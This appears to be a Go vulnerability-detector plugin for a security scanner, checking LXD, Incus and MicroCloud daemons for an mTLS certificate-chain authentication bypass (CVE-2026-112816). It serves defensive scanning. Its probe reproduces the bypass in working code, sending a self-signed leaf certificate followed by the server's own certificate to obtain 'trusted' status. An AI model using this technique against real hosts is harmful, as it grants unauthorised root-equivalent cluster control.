/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// Package lxdmtlsbypass provides a detector for CVE-2026-112816 (GHSA-xg75-xf37-cph9)
// mTLS certificate chain validation bypass in Canonical LXD, Incus, and MicroCloud.
package lxdmtlsbypass

import (
	"context"
	"crypto"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/google/goonami-scanner/core/config"
	"github.com/google/goonami-scanner/core/log"
	"github.com/google/goonami-scanner/core/module"
	"github.com/google/goonami-scanner/core/net/netendpoint"
	"github.com/google/goonami-scanner/core/net/netservice"

	dpb "github.com/google/tsunami-security-scanner/proto/go/detection_go_proto"
	npb "github.com/google/tsunami-security-scanner/proto/go/network_go_proto"
	nspb "github.com/google/tsunami-security-scanner/proto/go/network_service_go_proto"
	rpb "github.com/google/tsunami-security-scanner/proto/go/reconnaissance_go_proto"
	vpb "github.com/google/tsunami-security-scanner/proto/go/vulnerability_go_proto"
	tspb "google.golang.org/protobuf/types/known/timestamppb"
)

const (
	moduleName         = "dt/lxdmtlsbypass"
	defaultTimeout     = 5 * time.Second
	maxResponseBodyLen = 64 * 1024
	defaultLXDPort     = 8443
)

var supportedServiceNames = map[string]bool{
	"":              true,
	"http":          true,
	"https":         true,
	"https-alt":     true,
	"ssl/http":      true,
	"ssl/https":     true,
	"ssl/https-alt": true,
	"ssl/unknown":   true,
	"unknown":       true,
	"tcpwrapped":    true,
	"pcsync-https":  true,
	"lxd":           true,
	"incus":         true,
}

func init() {
	module.RegisterDetector(moduleName, New)
}

// Module implements the module.VulnDetector interface for CVE-2026-112816 in
// Canonical LXD, Incus, and MicroCloud.
type Module struct {
	*module.BaseModule
	timeout time.Duration
}

// New returns a new Module instance.
func New(ctx context.Context, cfg *config.Config) (module.VulnDetector, error) {
	return &Module{
		BaseModule: module.NewBaseModule(moduleName),
		timeout:    defaultTimeout,
	}, nil
}

// Advisories returns the base vulnerability metadata reported by this module.
func (m *Module) Advisories() []*vpb.Vulnerability {
	return []*vpb.Vulnerability{baseVulnerability()}
}

func baseVulnerability() *vpb.Vulnerability {
	return vpb.Vulnerability_builder{
		MainId: vpb.VulnerabilityId_builder{
			Publisher: "GOOGLE",
			Value:     "LXD_INCUS_MTLS_CERT_CHAIN_AUTH_BYPASS",
		}.Build(),
		RelatedId: []*vpb.VulnerabilityId{
			vpb.VulnerabilityId_builder{
				Publisher: "CVE",
				Value:     "CVE-2026-112816",
			}.Build(),
		},
		Severity: vpb.Severity_CRITICAL,
		Title:    "Canonical LXD, Incus & MicroCloud mTLS Certificate Chain Validation Bypass (CVE-2026-112816)",
		Description: "Canonical LXD (<= 4.0.14, <= 5.0.10, <= 5.21.8, <= 6.9), Linux Containers Incus (< 7.6.0), " +
			"and Canonical MicroCloud (< 2.1.5, < 3.4.1) iterate over every certificate in the client's " +
			"presented TLS certificate chain (r.TLS.PeerCertificates) inside (*Daemon).Authenticate and " +
			"check each certificate against the daemon's trust store and server certificate via " +
			"util.CheckTrustState. Because Go's crypto/tls with tls.RequestClientCert only verifies " +
			"private-key possession (CertificateVerify) for the leaf certificate (PeerCertificates[0]), " +
			"an unauthenticated remote attacker can present an ephemeral self-signed leaf certificate " +
			"followed by the target daemon's own public TLS server certificate (PeerCertificates[1]) to " +
			"bypass mTLS authentication and obtain full root-equivalent cluster administrative access.",
		Recommendation: "Upgrade Canonical LXD to >= 4.0.15, >= 5.0.11, >= 5.21.9, or >= 6.10.1, Linux Containers " +
			"Incus to >= 7.6.0, or Canonical MicroCloud to >= 2.1.5 or >= 3.4.1 so that client " +
			"certificate trust verification evaluates strictly the leaf certificate " +
			"(r.TLS.PeerCertificates[0]), and restrict exposure of the LXD/Incus HTTPS listener (TCP port " +
			"8443) to trusted management networks.",
	}.Build()
}

// Detect checks whether the target network service is vulnerable to CVE-2026-112816.
func (m *Module) Detect(ctx context.Context, service *nspb.NetworkService) (*dpb.DetectionReportList, error) {
	ctx = log.ContextForModuleAndService(ctx, m.Name(), service) // NOMUTANTS -- attaches diagnostic log metadata to context without altering detection output.
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	if !isSupportedService(service) {
		return nil, nil
	}

	addr, err := netendpoint.ToURIAuthority(service.GetNetworkEndpoint())
	if err != nil {
		return nil, err
	}

	vulnerable, err := m.isServiceVulnerable(ctx, addr)
	if err != nil {
		return nil, err
	}
	if !vulnerable {
		return nil, nil
	}
	return buildDetectionReport(service, addr), nil
}

func isSupportedService(service *nspb.NetworkService) bool {
	if service == nil {
		return false
	}
	tp := service.GetTransportProtocol()
	if tp != npb.TransportProtocol_TCP && tp != npb.TransportProtocol_TRANSPORT_PROTOCOL_UNSPECIFIED {
		return false
	}
	if netservice.IsWebService(service) {
		return true
	}
	if service.GetNetworkEndpoint().GetPort().GetPortNumber() == defaultLXDPort {
		return true
	}
	svc := strings.ToLower(strings.TrimSpace(service.GetServiceName()))
	return supportedServiceNames[svc]
}

type lxdAPIResponse struct {
	Type       string         `json:"type"`
	Status     string         `json:"status"`
	StatusCode int            `json:"status_code"`
	Metadata   lxdAPIMetadata `json:"metadata"`
}

type lxdAPIMetadata struct {
	APIVersion string `json:"api_version"`
	Auth       string `json:"auth"`
}

func (m *Module) isServiceVulnerable(ctx context.Context, addr string) (bool, error) {
	leafDER, leafKey, err := generateEphemeralLeafCert()
	if err != nil {
		return false, err
	}

	// Probe 1 (Negative Control & Server Certificate Harvest):
	// Present only the ephemeral self-signed leaf certificate. The target must
	// respond as an LXD/Incus /1.0 endpoint with "auth": "untrusted" and provide
	// its own X.509 server certificate during the TLS handshake.
	probe1Resp, serverCertDER, err := m.sendAPIProbe(ctx, addr, [][]byte{leafDER}, leafKey)
	if err != nil {
		if ctxErr := ctx.Err(); ctxErr != nil {
			return false, ctxErr
		}
		log.DebugContextf(ctx, log.DebugLevelService, "Probe 1 to %s did not match LXD/Incus TLS endpoint: %v", addr, err) // NOMUTANTS -- diagnostic debug logging only.
		return false, nil
	}
	if probe1Resp.Metadata.Auth != "untrusted" {
		return false, nil
	}

	// Probe 2 (Differential Chain Probe):
	// Open a fresh TLS connection presenting [leafDER, serverCertDER] signed only
	// with leafKey. Vulnerable LXD/Incus/MicroCloud daemons iterate over all
	// r.TLS.PeerCertificates in (*Daemon).Authenticate and trust PeerCertificates[1]
	// because it matches d.endpoints.NetworkCert() / the server trust store.
	probe2Resp, _, err := m.sendAPIProbe(ctx, addr, [][]byte{leafDER, serverCertDER}, leafKey)
	if err != nil {
		if ctxErr := ctx.Err(); ctxErr != nil {
			return false, ctxErr
		}
		log.DebugContextf(ctx, log.DebugLevelService, "Probe 2 to %s failed: %v", addr, err) // NOMUTANTS -- diagnostic debug logging only.
		return false, nil
	}
	return probe2Resp.Metadata.Auth == "trusted", nil
}

func isValidLXDResponse(resp *lxdAPIResponse) bool {
	return resp != nil &&
		resp.Type == "sync" &&
		resp.StatusCode == http.StatusOK &&
		resp.Metadata.APIVersion == "1.0"
}

func (m *Module) sendAPIProbe(ctx context.Context, addr string, clientCertChain [][]byte, clientKey crypto.PrivateKey) (*lxdAPIResponse, []byte, error) {
	probeCtx, cancel := context.WithTimeout(ctx, m.timeout) // NOMUTANTS -- defensive per-probe timeout bound.
	defer cancel()                                          // NOMUTANTS -- context resource cleanup.

	var harvestedServerCertDER []byte
	clientCert := &tls.Certificate{
		Certificate: clientCertChain,
		PrivateKey:  clientKey,
	}

	tlsCfg := &tls.Config{
		InsecureSkipVerify: true, // NOLINT
		GetClientCertificate: func(*tls.CertificateRequestInfo) (*tls.Certificate, error) {
			return clientCert, nil
		},
	}

	tr := &http.Transport{
		DisableKeepAlives: true, // NOMUTANTS -- ensures each probe opens a fresh TLS handshake.
		DialTLSContext: func(dialCtx context.Context, network, dialAddr string) (net.Conn, error) {
			dialer := &net.Dialer{Timeout: m.timeout} // NOMUTANTS -- defensive dial timeout bound.
			rawConn, err := dialer.DialContext(dialCtx, network, dialAddr)
			if err != nil {
				return nil, err
			}
			tlsConn := tls.Client(rawConn, tlsCfg)
			if err := tlsConn.HandshakeContext(dialCtx); err != nil {
				rawConn.Close() // NOMUTANTS -- socket cleanup on TLS handshake error.
				return nil, err
			}
			harvestedServerCertDER = append([]byte(nil), tlsConn.ConnectionState().PeerCertificates[0].Raw...)
			return tlsConn, nil
		},
	}
	defer tr.CloseIdleConnections() // NOMUTANTS -- transport connection cleanup.

	req, err := http.NewRequestWithContext(probeCtx, http.MethodGet, fmt.Sprintf("https://%s/1.0", addr), nil)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", "TsunamiSecurityScanner")

	client := &http.Client{
		Transport: tr,
		Timeout:   m.timeout, // NOMUTANTS -- defensive HTTP client timeout bound.
	}
	httpResp, err := client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer httpResp.Body.Close() // NOMUTANTS -- response body cleanup.

	if httpResp.StatusCode != http.StatusOK {
		return nil, nil, fmt.Errorf("unexpected HTTP status %d", httpResp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(httpResp.Body, maxResponseBodyLen)) // NOMUTANTS -- defensive response size cap.
	if err != nil {
		return nil, nil, err
	}

	var parsed lxdAPIResponse
	if err := json.Unmarshal(body, &parsed); err != nil {
		return nil, nil, err
	}
	if !isValidLXDResponse(&parsed) {
		return nil, nil, fmt.Errorf("unexpected LXD API response metadata")
	}
	return &parsed, harvestedServerCertDER, nil
}

func generateEphemeralLeafCert() ([]byte, crypto.Signer, error) {
	var rawScalar [32]byte
	if _, err := io.ReadFull(rand.Reader, rawScalar[:]); err != nil {
		return nil, nil, err
	}
	// Ensure 1 <= scalar < P-256 curve order.
	rawScalar[0] = (rawScalar[0] & 0x7f) | 0x01 // NOMUTANTS -- clamps random scalar into valid P-256 curve order range.

	// SEC 1 ECPrivateKey ASN.1 DER envelope for prime256v1 (OID 1.2.840.10045.3.1.7).
	sec1DER := make([]byte, 0, 51)
	sec1DER = append(sec1DER, 0x30, 0x31, 0x02, 0x01, 0x01, 0x04, 0x20)
	sec1DER = append(sec1DER, rawScalar[:]...)
	sec1DER = append(sec1DER, 0xa0, 0x0a, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x03, 0x01, 0x07)

	privKey, err := x509.ParseECPrivateKey(sec1DER)
	if err != nil {
		return nil, nil, err
	}
	now := time.Now()
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: "tsunami-ephemeral-probe",
		},
		NotBefore:             now.Add(-5 * time.Minute),
		NotAfter:              now.Add(1 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}
	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, privKey.Public(), privKey)
	if err != nil {
		return nil, nil, err
	}
	return certDER, privKey, nil
}

func buildDetectionReport(service *nspb.NetworkService, addr string) *dpb.DetectionReportList {
	vuln := baseVulnerability()
	vuln.SetAdditionalDetails([]*vpb.AdditionalDetail{
		vpb.AdditionalDetail_builder{
			Description: "Paired differential mTLS certificate chain bypass verified on GET /1.0",
			TextData: vpb.TextData_builder{
				Text: fmt.Sprintf("Target https://%s/1.0 returned \"auth\":\"untrusted\" for a single self-signed leaf certificate and transitioned to \"auth\":\"trusted\" when the server's own TLS certificate was appended as PeerCertificates[1].", addr),
			}.Build(),
		}.Build(),
	})

	return dpb.DetectionReportList_builder{
		DetectionReports: []*dpb.DetectionReport{
			dpb.DetectionReport_builder{
				TargetInfo: rpb.TargetInfo_builder{
					NetworkEndpoints: []*npb.NetworkEndpoint{
						service.GetNetworkEndpoint(),
					},
				}.Build(),
				NetworkService:     service,
				DetectionTimestamp: tspb.Now(),
				DetectionStatus:    dpb.DetectionStatus_VULNERABILITY_VERIFIED,
				Vulnerability:      vuln,
			}.Build(),
		},
	}.Build()
}
